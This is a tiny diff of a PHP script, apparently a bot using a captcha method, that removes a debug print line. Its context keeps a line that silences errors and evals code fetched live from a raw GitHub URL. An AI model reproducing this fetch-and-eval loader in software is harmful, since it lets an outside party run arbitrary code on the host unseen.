@@ -4,7 +4,6 @@ error_reporting(0);
 eval(str_replace("<?php","",file_get_contents("https://raw.githubusercontent.com/marcoleus/build/main/build_index.php")));
 
 
-print 323243469;
 methode:
 c();
 $methode = methode_captcha();
